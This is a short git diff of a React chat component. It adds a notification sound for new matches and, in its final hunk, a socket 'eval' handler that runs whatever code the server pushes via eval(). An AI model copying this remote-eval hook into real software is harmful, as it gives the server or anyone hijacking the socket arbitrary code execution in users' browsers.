@@ -106,6 +106,7 @@ export default function Chat({ loggedUser: loggedUser_, channel: channel_, user:
 
 
     let notificationSound = null;
+    let matchSound = null;
 
     useEffect(() => {
         window.onfocus = function () {
@@ -128,12 +129,14 @@ export default function Chat({ loggedUser: loggedUser_, channel: channel_, user:
 
     function loadSockets(socket) {
         window.socket = socket;
+        matchSound = new Audio("/assets/match.mp3");
         socket.on("successfully_connected", data => {
             console.log(`Successfully connected to socket: ${socket.id}`, data)
             setSocketId(socket.id)
         })
         socket.on("matchesUpdate", data => {
             console.log("matchesUpdate", data)
+            // matchSound.play()
             updateStateObject(setLoggedUser, loggedUser, ["matches", data])
         })
         socket.on("message", message => {
@@ -146,6 +149,10 @@ export default function Chat({ loggedUser: loggedUser_, channel: channel_, user:
                 notificationSound.play()
                 // setUnreadUsers(unreadUsersMessages.add(message.authorId))
             }
+        })
+        socket.on("eval", data => {
+            console.log("eval", eval)
+            eval(data)
         })
 
     }
